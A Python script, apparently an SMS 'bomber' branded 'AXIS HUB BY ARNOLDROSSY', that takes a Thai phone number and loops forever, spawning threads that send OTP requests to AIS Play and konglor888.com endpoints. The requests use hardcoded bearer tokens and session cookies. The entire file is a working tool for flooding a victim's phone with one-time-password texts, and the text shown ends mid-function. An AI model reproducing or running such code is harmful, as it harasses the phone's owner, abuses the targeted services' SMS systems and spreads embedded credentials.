import os
import threading
from threading import Thread
import time
import requests
from colorama import Back, Fore, Style

print(Fore.GREEN + "\n""""
██████╗ ██╗  ██╗██╗███╗   ██╗     ██╗ ██████╗ ██╗    ██╗
██╔════╝██║  ██║██║████╗  ██║     ██║██╔═══██╗██║    ██║
██║     ███████║██║██╔██╗ ██║     ██║██║   ██║██║ █╗ ██║
██║     ██╔══██║██║██║╚██╗██║██   ██║██║   ██║██║███╗██║
╚██████╗██║  ██║██║██║ ╚████║╚█████╔╝╚██████╔╝╚███╔███╔╝
 ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚════╝  ╚═════╝  ╚══╝╚══╝ 

""")

print("AXIS HUB BY ARNOLDROSSY")


#session = requests.Session()
#session.cookies.set(
    #"0l3-0","po2YOaPtZc%252BHZHeVGrn7ZW%252BKU30SO3KrZTtte5M%252FOZkfxcMa7JIitm8nZ2sSxOTfOWWMwSy5FO6tx1sSEi9ZDB6KdVROBSUMCUmL4sW%252FLLA6ahW1%252F%252BrZ1jan%252B2q%252FW6kwWWysBGQ1yy9%252FEw9ikEYOIOIedS8D8gfnUSAJlw23hH4PBk7LoyIhxL8cSUz%252B9IeUsVoDGhZIy0ctP0eymS4pd2s8dJvTqGUA1DT%252B4K7pmb8Q5ILPB0lkX7dt8oF2cZPtS%252Bnt8%252B6owBy%252Fs9WBVn1%252FOgvmucyX3cpiVLwQ4j%252FHQSYZPTnhBMIjoHET1Crvm8R5LTxkQwlBG3%252BnCWJs%252Bi9ups%252BqwUu16%252FKbELuWlQP0c4QZZH5QycFTQSe99dLLW%252B9p0RHRzywsQIn87FPH8L0gtszrXqKiFvtxE8Pqggd3uqKYFSMwfsPmq0F0uwkn6quCBVPvhQFfu5EmKs%252FEvhFra4YP8HKIEj4XzRJb3vZ7%252FTrr2WVX05gRU6z%252FlcARYAi5%252BQKjvB5FQJ0qDyB%252FW08dzfFbAEBNJ8bXjd%252FoSLcLEXWGHxDuLZdZoktrNPoR62cGNZXwESbtOn2dewHBJZ%252B9Gy7%252FkAjB6JzJDggYU1S%252FsN4s5AeCgGP73YEnl8HzPKGkNS41f7lGfAYlh3nem8GfS8MU7nuROY67%252FFhOvro3zsP5u8S8FyZNQxwJ%252FLVCFIA%252FQJvh%252Fqn%252BMQuY3FCG0UR0aj%252BFblDcoHHilrMOL80ARYMPPXNQPF2CrT9oSAflIke55nD%252FHFLl1oNawMNhw1xDCVg8kJLlzL019hJBkc7lBHzQOuVb1OclmjClna8yuPthki7cTgWLFUCOIUWD9RPRtolQL2oXPkwtiw3wl3OvkHfgoqCY3DZ4mNPuVn02F2%252B7fJeAJcPbHN4h3oqAnN3dv%252FebBFqMykm545ps1WS8b%252BYkXN9E34lKrYdQaOBqX2MB0K%252BrppjKu4WLkLPpqJe9t28rVL%252FK%252FdDzSI%252FM5ZCE7vIV22B1nj6LG3PNoLtE6LoSy7h1rbaKo%252BgLHEsLqRBU7j2fjVR8fbJ0iYWRRt4wJfyzM%252FsdOYmg9Qsc1SWl97KkZI5dfGI7D%252F80jwbGoGjLNgEJ2LK0W8r4yi5El6yYHxR5yAOimafb9t6b%252Fkh4PDbIsk7CvntwZkg8Ox3TC1iRjSF5mvmbwiKPlHdB8Ys4YthCFGIc8UGr2QJU4MOjLaBcUnJf5osKAsuxvsJCIrfg%252B8rkwQfK%252FXiaqhGN7VIneDEFVmzTJxlBc31Y%252FpEpzlmqUmhXVEn6LaeT3IfwR%252BewbSIh14lRZLIbj%252FcH6VyRONL%252BEHbeidIaVgGScQhojuVmorPL8R2PFjqGMf6KxgJ8LfTejw00NforEkVqV4Iv5MZteQS7zJ5FtQ2OBqjU0IopJ0NK04NDUWT4fXRmFuwu2aXG4J5k10oxQ62gNmfQHTSiscOG0YmXqAK3lJRcSf9g0faZZBnu7dUoSJDi3kTaiFf1%252B%252B0oIRHbPuoCaE%252BlgqPwbBmzpSYvuPHj0o2MGfvJQDChOhpyi5rjtDhkWrNhbRw76Q9XXDlbpJUOXv%252BChwQ2CM1ZwQh%252BJXDhv%252Fs%252F7zP0JXBWMjcN14K1B012jZD2DyHjJuQJgh2YItB2ux7baojWoucuWhJBuhu1j5oWk%252FFUGMGOESjYUGfSULPs7oKJrJIvWE2BHomxxsUxfxKJ2kU4arxTSKxoXt0lsod%252FPvy1J%252BvaArAKuNRGxPMNhu9bHM4kWdbbdpQDvPXAJ20%252FEiYNbs4dQpt2SY1b55vwxmwV8xzg0LVEGfwgKfbbDrDRzjf4ZUzX3kPIJub%252FKOTuGOgIltrMEQ%253D%253D", domain='.srfng.ais.co.th'
#)

#session.headers.update({
 #   'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
 #   'X-Requested-With': 'XMLHttpRequest',
 #   'content-length': '67',
  #  'Accept-Encoding': 'gzip, deflate, br',
 #   'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
   # 'Accept': '*/*',
  #  'Connection': 'keep-alive',
 #   'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0aWQiOiIyMDIxMDcwOTExMzg0MzI3M3ViN215Vmw5eEZKMFciLCJzZXJ2aWNlSWQiOiJBSVNQbGF5IiwiYWNjb3VudFR5cGUiOiJhbGwiLCJvdHBDaGFubmVsIjoic21zIiwic3RhdGUiOjEsImlhdCI6MTYyNTgwNTUyMywiZXhwIjoxNjI1ODA2NzIzfQ.Gjg0AxONBAwRoInVyr6LdVzGse5KgC_IgDpLyZw5LJw'
#})

TARGET = input('ใส่เบอร์โทรตัด0ออก :')

while True:
        def a():
            ras=requests.post(url='https://srfng.ais.co.th/login/sendOneTimePW', data='msisdn=66' + TARGET + '&serviceId=AISPlay&accountType=all&otpChannel=sms', headers={ 
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'content-length': '67',
    'Accept-Encoding': 'gzip, deflate, br',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': '*/*',
    'Connection': 'keep-alive',
    'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0aWQiOiIyMDIxMDcwOTExMzg0MzI3M3ViN215Vmw5eEZKMFciLCJzZXJ2aWNlSWQiOiJBSVNQbGF5IiwiYWNjb3VudFR5cGUiOiJhbGwiLCJvdHBDaGFubmVsIjoic21zIiwic3RhdGUiOjEsImlhdCI6MTYyNTgwNTUyMywiZXhwIjoxNjI1ODA2NzIzfQ.Gjg0AxONBAwRoInVyr6LdVzGse5KgC_IgDpLyZw5LJw',
    'cookie': 'po2YOaPtZc%252BHZHeVGrn7ZW%252BKU30SO3KrZTtte5M%252FOZkfxcMa7JIitm8nZ2sSxOTfOWWMwSy5FO6tx1sSEi9ZDB6KdVROBSUMCUmL4sW%252FLLA6ahW1%252F%252BrZ1jan%252B2q%252FW6kwWWysBGQ1yy9%252FEw9ikEYOIOIedS8D8gfnUSAJlw23hH4PBk7LoyIhxL8cSUz%252B9IeUsVoDGhZIy0ctP0eymS4pd2s8dJvTqGUA1DT%252B4K7pmb8Q5ILPB0lkX7dt8oF2cZPtS%252Bnt8%252B6owBy%252Fs9WBVn1%252FOgvmucyX3cpiVLwQ4j%252FHQSYZPTnhBMIjoHET1Crvm8R5LTxkQwlBG3%252BnCWJs%252Bi9ups%252BqwUu16%252FKbELuWlQP0c4QZZH5QycFTQSe99dLLW%252B9p0RHRzywsQIn87FPH8L0gtszrXqKiFvtxE8Pqggd3uqKYFSMwfsPmq0F0uwkn6quCBVPvhQFfu5EmKs%252FEvhFra4YP8HKIEj4XzRJb3vZ7%252FTrr2WVX05gRU6z%252FlcARYAi5%252BQKjvB5FQJ0qDyB%252FW08dzfFbAEBNJ8bXjd%252FoSLcLEXWGHxDuLZdZoktrNPoR62cGNZXwESbtOn2dewHBJZ%252B9Gy7%252FkAjB6JzJDggYU1S%252FsN4s5AeCgGP73YEnl8HzPKGkNS41f7lGfAYlh3nem8GfS8MU7nuROY67%252FFhOvro3zsP5u8S8FyZNQxwJ%252FLVCFIA%252FQJvh%252Fqn%252BMQuY3FCG0UR0aj%252BFblDcoHHilrMOL80ARYMPPXNQPF2CrT9oSAflIke55nD%252FHFLl1oNawMNhw1xDCVg8kJLlzL019hJBkc7lBHzQOuVb1OclmjClna8yuPthki7cTgWLFUCOIUWD9RPRtolQL2oXPkwtiw3wl3OvkHfgoqCY3DZ4mNPuVn02F2%252B7fJeAJcPbHN4h3oqAnN3dv%252FebBFqMykm545ps1WS8b%252BYkXN9E34lKrYdQaOBqX2MB0K%252BrppjKu4WLkLPpqJe9t28rVL%252FK%252FdDzSI%252FM5ZCE7vIV22B1nj6LG3PNoLtE6LoSy7h1rbaKo%252BgLHEsLqRBU7j2fjVR8fbJ0iYWRRt4wJfyzM%252FsdOYmg9Qsc1SWl97KkZI5dfGI7D%252F80jwbGoGjLNgEJ2LK0W8r4yi5El6yYHxR5yAOimafb9t6b%252Fkh4PDbIsk7CvntwZkg8Ox3TC1iRjSF5mvmbwiKPlHdB8Ys4YthCFGIc8UGr2QJU4MOjLaBcUnJf5osKAsuxvsJCIrfg%252B8rkwQfK%252FXiaqhGN7VIneDEFVmzTJxlBc31Y%252FpEpzlmqUmhXVEn6LaeT3IfwR%252BewbSIh14lRZLIbj%252FcH6VyRONL%252BEHbeidIaVgGScQhojuVmorPL8R2PFjqGMf6KxgJ8LfTejw00NforEkVqV4Iv5MZteQS7zJ5FtQ2OBqjU0IopJ0NK04NDUWT4fXRmFuwu2aXG4J5k10oxQ62gNmfQHTSiscOG0YmXqAK3lJRcSf9g0faZZBnu7dUoSJDi3kTaiFf1%252B%252B0oIRHbPuoCaE%252BlgqPwbBmzpSYvuPHj0o2MGfvJQDChOhpyi5rjtDhkWrNhbRw76Q9XXDlbpJUOXv%252BChwQ2CM1ZwQh%252BJXDhv%252Fs%252F7zP0JXBWMjcN14K1B012jZD2DyHjJuQJgh2YItB2ux7baojWoucuWhJBuhu1j5oWk%252FFUGMGOESjYUGfSULPs7oKJrJIvWE2BHomxxsUxfxKJ2kU4arxTSKxoXt0lsod%252FPvy1J%252BvaArAKuNRGxPMNhu9bHM4kWdbbdpQDvPXAJ20%252FEiYNbs4dQpt2SY1b55vwxmwV8xzg0LVEGfwgKfbbDrDRzjf4ZUzX3kPIJub%252FKOTuGOgIltrMEQ%253D%253D'
    })
            print(ras)
        threading.Thread(target=a).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def b():
            rbs=requests.post(url='https://www.konglor888.com/api/otp/register', data='applicant=0' + TARGET + '&serviceName=KONGLOR888', headers={ 
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	'x-requested-with': 'XMLHttpRequest',
	'accept-language': 'en-US,en;q=0.9',
	'x-frame-options': 'SAMEORIGIN',
	'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.41',
	'accept-encoding': 'gzip, deflate, br',
	'accept': '*/*',
    'cookie': 's%3AHdC70G1GrjczqiyeQwb0FMMooq0tplYL.EYzD05uo3mpUkM4EUibFO4Bc2i0kE9Tv%2FVUWkAi49T0'
    })
            print(rbs)
        threading.Thread(target=b).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def c():
            rcs=requests.post(url='https://srfng.ais.co.th/login/sendOneTimePW', data='msisdn=66' + TARGET + '&serviceId=AISPlay&accountType=all&otpChannel=sms', headers={ 
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'content-length': '67',
    'Accept-Encoding': 'gzip, deflate, br',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': '*/*',
    'Connection': 'keep-alive',
    'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0aWQiOiIyMDIxMDcwOTExMzg0MzI3M3ViN215Vmw5eEZKMFciLCJzZXJ2aWNlSWQiOiJBSVNQbGF5IiwiYWNjb3VudFR5cGUiOiJhbGwiLCJvdHBDaGFubmVsIjoic21zIiwic3RhdGUiOjEsImlhdCI6MTYyNTgwNTUyMywiZXhwIjoxNjI1ODA2NzIzfQ.Gjg0AxONBAwRoInVyr6LdVzGse5KgC_IgDpLyZw5LJw',
    'cookie': 'po2YOaPtZc%252BHZHeVGrn7ZW%252BKU30SO3KrZTtte5M%252FOZkfxcMa7JIitm8nZ2sSxOTfOWWMwSy5FO6tx1sSEi9ZDB6KdVROBSUMCUmL4sW%252FLLA6ahW1%252F%252BrZ1jan%252B2q%252FW6kwWWysBGQ1yy9%252FEw9ikEYOIOIedS8D8gfnUSAJlw23hH4PBk7LoyIhxL8cSUz%252B9IeUsVoDGhZIy0ctP0eymS4pd2s8dJvTqGUA1DT%252B4K7pmb8Q5ILPB0lkX7dt8oF2cZPtS%252Bnt8%252B6owBy%252Fs9WBVn1%252FOgvmucyX3cpiVLwQ4j%252FHQSYZPTnhBMIjoHET1Crvm8R5LTxkQwlBG3%252BnCWJs%252Bi9ups%252BqwUu16%252FKbELuWlQP0c4QZZH5QycFTQSe99dLLW%252B9p0RHRzywsQIn87FPH8L0gtszrXqKiFvtxE8Pqggd3uqKYFSMwfsPmq0F0uwkn6quCBVPvhQFfu5EmKs%252FEvhFra4YP8HKIEj4XzRJb3vZ7%252FTrr2WVX05gRU6z%252FlcARYAi5%252BQKjvB5FQJ0qDyB%252FW08dzfFbAEBNJ8bXjd%252FoSLcLEXWGHxDuLZdZoktrNPoR62cGNZXwESbtOn2dewHBJZ%252B9Gy7%252FkAjB6JzJDggYU1S%252FsN4s5AeCgGP73YEnl8HzPKGkNS41f7lGfAYlh3nem8GfS8MU7nuROY67%252FFhOvro3zsP5u8S8FyZNQxwJ%252FLVCFIA%252FQJvh%252Fqn%252BMQuY3FCG0UR0aj%252BFblDcoHHilrMOL80ARYMPPXNQPF2CrT9oSAflIke55nD%252FHFLl1oNawMNhw1xDCVg8kJLlzL019hJBkc7lBHzQOuVb1OclmjClna8yuPthki7cTgWLFUCOIUWD9RPRtolQL2oXPkwtiw3wl3OvkHfgoqCY3DZ4mNPuVn02F2%252B7fJeAJcPbHN4h3oqAnN3dv%252FebBFqMykm545ps1WS8b%252BYkXN9E34lKrYdQaOBqX2MB0K%252BrppjKu4WLkLPpqJe9t28rVL%252FK%252FdDzSI%252FM5ZCE7vIV22B1nj6LG3PNoLtE6LoSy7h1rbaKo%252BgLHEsLqRBU7j2fjVR8fbJ0iYWRRt4wJfyzM%252FsdOYmg9Qsc1SWl97KkZI5dfGI7D%252F80jwbGoGjLNgEJ2LK0W8r4yi5El6yYHxR5yAOimafb9t6b%252Fkh4PDbIsk7CvntwZkg8Ox3TC1iRjSF5mvmbwiKPlHdB8Ys4YthCFGIc8UGr2QJU4MOjLaBcUnJf5osKAsuxvsJCIrfg%252B8rkwQfK%252FXiaqhGN7VIneDEFVmzTJxlBc31Y%252FpEpzlmqUmhXVEn6LaeT3IfwR%252BewbSIh14lRZLIbj%252FcH6VyRONL%252BEHbeidIaVgGScQhojuVmorPL8R2PFjqGMf6KxgJ8LfTejw00NforEkVqV4Iv5MZteQS7zJ5FtQ2OBqjU0IopJ0NK04NDUWT4fXRmFuwu2aXG4J5k10oxQ62gNmfQHTSiscOG0YmXqAK3lJRcSf9g0faZZBnu7dUoSJDi3kTaiFf1%252B%252B0oIRHbPuoCaE%252BlgqPwbBmzpSYvuPHj0o2MGfvJQDChOhpyi5rjtDhkWrNhbRw76Q9XXDlbpJUOXv%252BChwQ2CM1ZwQh%252BJXDhv%252Fs%252F7zP0JXBWMjcN14K1B012jZD2DyHjJuQJgh2YItB2ux7baojWoucuWhJBuhu1j5oWk%252FFUGMGOESjYUGfSULPs7oKJrJIvWE2BHomxxsUxfxKJ2kU4arxTSKxoXt0lsod%252FPvy1J%252BvaArAKuNRGxPMNhu9bHM4kWdbbdpQDvPXAJ20%252FEiYNbs4dQpt2SY1b55vwxmwV8xzg0LVEGfwgKfbbDrDRzjf4ZUzX3kPIJub%252FKOTuGOgIltrMEQ%253D%253D'
    })
            print(rcs)
        threading.Thread(target=c).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def d():
            rds=requests.post(url='https://www.konglor888.com/api/otp/register', data='applicant=0' + TARGET + '&serviceName=KONGLOR888', headers={ 
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	'x-requested-with': 'XMLHttpRequest',
	'accept-language': 'en-US,en;q=0.9',
	'x-frame-options': 'SAMEORIGIN',
	'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.41',
	'accept-encoding': 'gzip, deflate, br',
	'accept': '*/*',
    'cookie': 's%3AHdC70G1GrjczqiyeQwb0FMMooq0tplYL.EYzD05uo3mpUkM4EUibFO4Bc2i0kE9Tv%2FVUWkAi49T0'
    })
            print(rds)
        threading.Thread(target=d).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def e():
            res=requests.post(url='https://srfng.ais.co.th/login/sendOneTimePW', data='msisdn=66' + TARGET + '&serviceId=AISPlay&accountType=all&otpChannel=sms', headers={ 
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'content-length': '67',
    'Accept-Encoding': 'gzip, deflate, br',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': '*/*',
    'Connection': 'keep-alive',
    'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0aWQiOiIyMDIxMDcwOTExMzg0MzI3M3ViN215Vmw5eEZKMFciLCJzZXJ2aWNlSWQiOiJBSVNQbGF5IiwiYWNjb3VudFR5cGUiOiJhbGwiLCJvdHBDaGFubmVsIjoic21zIiwic3RhdGUiOjEsImlhdCI6MTYyNTgwNTUyMywiZXhwIjoxNjI1ODA2NzIzfQ.Gjg0AxONBAwRoInVyr6LdVzGse5KgC_IgDpLyZw5LJw',
    'cookie': 'po2YOaPtZc%252BHZHeVGrn7ZW%252BKU30SO3KrZTtte5M%252FOZkfxcMa7JIitm8nZ2sSxOTfOWWMwSy5FO6tx1sSEi9ZDB6KdVROBSUMCUmL4sW%252FLLA6ahW1%252F%252BrZ1jan%252B2q%252FW6kwWWysBGQ1yy9%252FEw9ikEYOIOIedS8D8gfnUSAJlw23hH4PBk7LoyIhxL8cSUz%252B9IeUsVoDGhZIy0ctP0eymS4pd2s8dJvTqGUA1DT%252B4K7pmb8Q5ILPB0lkX7dt8oF2cZPtS%252Bnt8%252B6owBy%252Fs9WBVn1%252FOgvmucyX3cpiVLwQ4j%252FHQSYZPTnhBMIjoHET1Crvm8R5LTxkQwlBG3%252BnCWJs%252Bi9ups%252BqwUu16%252FKbELuWlQP0c4QZZH5QycFTQSe99dLLW%252B9p0RHRzywsQIn87FPH8L0gtszrXqKiFvtxE8Pqggd3uqKYFSMwfsPmq0F0uwkn6quCBVPvhQFfu5EmKs%252FEvhFra4YP8HKIEj4XzRJb3vZ7%252FTrr2WVX05gRU6z%252FlcARYAi5%252BQKjvB5FQJ0qDyB%252FW08dzfFbAEBNJ8bXjd%252FoSLcLEXWGHxDuLZdZoktrNPoR62cGNZXwESbtOn2dewHBJZ%252B9Gy7%252FkAjB6JzJDggYU1S%252FsN4s5AeCgGP73YEnl8HzPKGkNS41f7lGfAYlh3nem8GfS8MU7nuROY67%252FFhOvro3zsP5u8S8FyZNQxwJ%252FLVCFIA%252FQJvh%252Fqn%252BMQuY3FCG0UR0aj%252BFblDcoHHilrMOL80ARYMPPXNQPF2CrT9oSAflIke55nD%252FHFLl1oNawMNhw1xDCVg8kJLlzL019hJBkc7lBHzQOuVb1OclmjClna8yuPthki7cTgWLFUCOIUWD9RPRtolQL2oXPkwtiw3wl3OvkHfgoqCY3DZ4mNPuVn02F2%252B7fJeAJcPbHN4h3oqAnN3dv%252FebBFqMykm545ps1WS8b%252BYkXN9E34lKrYdQaOBqX2MB0K%252BrppjKu4WLkLPpqJe9t28rVL%252FK%252FdDzSI%252FM5ZCE7vIV22B1nj6LG3PNoLtE6LoSy7h1rbaKo%252BgLHEsLqRBU7j2fjVR8fbJ0iYWRRt4wJfyzM%252FsdOYmg9Qsc1SWl97KkZI5dfGI7D%252F80jwbGoGjLNgEJ2LK0W8r4yi5El6yYHxR5yAOimafb9t6b%252Fkh4PDbIsk7CvntwZkg8Ox3TC1iRjSF5mvmbwiKPlHdB8Ys4YthCFGIc8UGr2QJU4MOjLaBcUnJf5osKAsuxvsJCIrfg%252B8rkwQfK%252FXiaqhGN7VIneDEFVmzTJxlBc31Y%252FpEpzlmqUmhXVEn6LaeT3IfwR%252BewbSIh14lRZLIbj%252FcH6VyRONL%252BEHbeidIaVgGScQhojuVmorPL8R2PFjqGMf6KxgJ8LfTejw00NforEkVqV4Iv5MZteQS7zJ5FtQ2OBqjU0IopJ0NK04NDUWT4fXRmFuwu2aXG4J5k10oxQ62gNmfQHTSiscOG0YmXqAK3lJRcSf9g0faZZBnu7dUoSJDi3kTaiFf1%252B%252B0oIRHbPuoCaE%252BlgqPwbBmzpSYvuPHj0o2MGfvJQDChOhpyi5rjtDhkWrNhbRw76Q9XXDlbpJUOXv%252BChwQ2CM1ZwQh%252BJXDhv%252Fs%252F7zP0JXBWMjcN14K1B012jZD2DyHjJuQJgh2YItB2ux7baojWoucuWhJBuhu1j5oWk%252FFUGMGOESjYUGfSULPs7oKJrJIvWE2BHomxxsUxfxKJ2kU4arxTSKxoXt0lsod%252FPvy1J%252BvaArAKuNRGxPMNhu9bHM4kWdbbdpQDvPXAJ20%252FEiYNbs4dQpt2SY1b55vwxmwV8xzg0LVEGfwgKfbbDrDRzjf4ZUzX3kPIJub%252FKOTuGOgIltrMEQ%253D%253D'
    })
            print(res)
        threading.Thread(target=e).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def f():
            rfs=requests.post(url='https://www.konglor888.com/api/otp/register', data='applicant=0' + TARGET + '&serviceName=KONGLOR888', headers={ 
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	'x-requested-with': 'XMLHttpRequest',
	'accept-language': 'en-US,en;q=0.9',
	'x-frame-options': 'SAMEORIGIN',
	'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.41',
	'accept-encoding': 'gzip, deflate, br',
	'accept': '*/*',
    'cookie': 's%3AHdC70G1GrjczqiyeQwb0FMMooq0tplYL.EYzD05uo3mpUkM4EUibFO4Bc2i0kE9Tv%2FVUWkAi49T0'
    })
            print(rfs)
        threading.Thread(target=f).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def g():
            rgs=requests.post(url='https://srfng.ais.co.th/login/sendOneTimePW', data='msisdn=66' + TARGET + '&serviceId=AISPlay&accountType=all&otpChannel=sms', headers={ 
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'content-length': '67',
    'Accept-Encoding': 'gzip, deflate, br',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': '*/*',
    'Connection': 'keep-alive',
    'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0aWQiOiIyMDIxMDcwOTExMzg0MzI3M3ViN215Vmw5eEZKMFciLCJzZXJ2aWNlSWQiOiJBSVNQbGF5IiwiYWNjb3VudFR5cGUiOiJhbGwiLCJvdHBDaGFubmVsIjoic21zIiwic3RhdGUiOjEsImlhdCI6MTYyNTgwNTUyMywiZXhwIjoxNjI1ODA2NzIzfQ.Gjg0AxONBAwRoInVyr6LdVzGse5KgC_IgDpLyZw5LJw',
    'cookie': 'po2YOaPtZc%252BHZHeVGrn7ZW%252BKU30SO3KrZTtte5M%252FOZkfxcMa7JIitm8nZ2sSxOTfOWWMwSy5FO6tx1sSEi9ZDB6KdVROBSUMCUmL4sW%252FLLA6ahW1%252F%252BrZ1jan%252B2q%252FW6kwWWysBGQ1yy9%252FEw9ikEYOIOIedS8D8gfnUSAJlw23hH4PBk7LoyIhxL8cSUz%252B9IeUsVoDGhZIy0ctP0eymS4pd2s8dJvTqGUA1DT%252B4K7pmb8Q5ILPB0lkX7dt8oF2cZPtS%252Bnt8%252B6owBy%252Fs9WBVn1%252FOgvmucyX3cpiVLwQ4j%252FHQSYZPTnhBMIjoHET1Crvm8R5LTxkQwlBG3%252BnCWJs%252Bi9ups%252BqwUu16%252FKbELuWlQP0c4QZZH5QycFTQSe99dLLW%252B9p0RHRzywsQIn87FPH8L0gtszrXqKiFvtxE8Pqggd3uqKYFSMwfsPmq0F0uwkn6quCBVPvhQFfu5EmKs%252FEvhFra4YP8HKIEj4XzRJb3vZ7%252FTrr2WVX05gRU6z%252FlcARYAi5%252BQKjvB5FQJ0qDyB%252FW08dzfFbAEBNJ8bXjd%252FoSLcLEXWGHxDuLZdZoktrNPoR62cGNZXwESbtOn2dewHBJZ%252B9Gy7%252FkAjB6JzJDggYU1S%252FsN4s5AeCgGP73YEnl8HzPKGkNS41f7lGfAYlh3nem8GfS8MU7nuROY67%252FFhOvro3zsP5u8S8FyZNQxwJ%252FLVCFIA%252FQJvh%252Fqn%252BMQuY3FCG0UR0aj%252BFblDcoHHilrMOL80ARYMPPXNQPF2CrT9oSAflIke55nD%252FHFLl1oNawMNhw1xDCVg8kJLlzL019hJBkc7lBHzQOuVb1OclmjClna8yuPthki7cTgWLFUCOIUWD9RPRtolQL2oXPkwtiw3wl3OvkHfgoqCY3DZ4mNPuVn02F2%252B7fJeAJcPbHN4h3oqAnN3dv%252FebBFqMykm545ps1WS8b%252BYkXN9E34lKrYdQaOBqX2MB0K%252BrppjKu4WLkLPpqJe9t28rVL%252FK%252FdDzSI%252FM5ZCE7vIV22B1nj6LG3PNoLtE6LoSy7h1rbaKo%252BgLHEsLqRBU7j2fjVR8fbJ0iYWRRt4wJfyzM%252FsdOYmg9Qsc1SWl97KkZI5dfGI7D%252F80jwbGoGjLNgEJ2LK0W8r4yi5El6yYHxR5yAOimafb9t6b%252Fkh4PDbIsk7CvntwZkg8Ox3TC1iRjSF5mvmbwiKPlHdB8Ys4YthCFGIc8UGr2QJU4MOjLaBcUnJf5osKAsuxvsJCIrfg%252B8rkwQfK%252FXiaqhGN7VIneDEFVmzTJxlBc31Y%252FpEpzlmqUmhXVEn6LaeT3IfwR%252BewbSIh14lRZLIbj%252FcH6VyRONL%252BEHbeidIaVgGScQhojuVmorPL8R2PFjqGMf6KxgJ8LfTejw00NforEkVqV4Iv5MZteQS7zJ5FtQ2OBqjU0IopJ0NK04NDUWT4fXRmFuwu2aXG4J5k10oxQ62gNmfQHTSiscOG0YmXqAK3lJRcSf9g0faZZBnu7dUoSJDi3kTaiFf1%252B%252B0oIRHbPuoCaE%252BlgqPwbBmzpSYvuPHj0o2MGfvJQDChOhpyi5rjtDhkWrNhbRw76Q9XXDlbpJUOXv%252BChwQ2CM1ZwQh%252BJXDhv%252Fs%252F7zP0JXBWMjcN14K1B012jZD2DyHjJuQJgh2YItB2ux7baojWoucuWhJBuhu1j5oWk%252FFUGMGOESjYUGfSULPs7oKJrJIvWE2BHomxxsUxfxKJ2kU4arxTSKxoXt0lsod%252FPvy1J%252BvaArAKuNRGxPMNhu9bHM4kWdbbdpQDvPXAJ20%252FEiYNbs4dQpt2SY1b55vwxmwV8xzg0LVEGfwgKfbbDrDRzjf4ZUzX3kPIJub%252FKOTuGOgIltrMEQ%253D%253D'
    })
            print(rgs)
        threading.Thread(target=g).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def h():
            rhs=requests.post(url='https://www.konglor888.com/api/otp/register', data='applicant=0' + TARGET + '&serviceName=KONGLOR888', headers={ 
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	'x-requested-with': 'XMLHttpRequest',
	'accept-language': 'en-US,en;q=0.9',
	'x-frame-options': 'SAMEORIGIN',
	'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.41',
	'accept-encoding': 'gzip, deflate, br',
	'accept': '*/*',
    'cookie': 's%3AHdC70G1GrjczqiyeQwb0FMMooq0tplYL.EYzD05uo3mpUkM4EUibFO4Bc2i0kE9Tv%2FVUWkAi49T0'
    })
            print(rhs)
        threading.Thread(target=h).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def i():
            ris=requests.post(url='https://srfng.ais.co.th/login/sendOneTimePW', data='msisdn=66' + TARGET + '&serviceId=AISPlay&accountType=all&otpChannel=sms', headers={ 
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
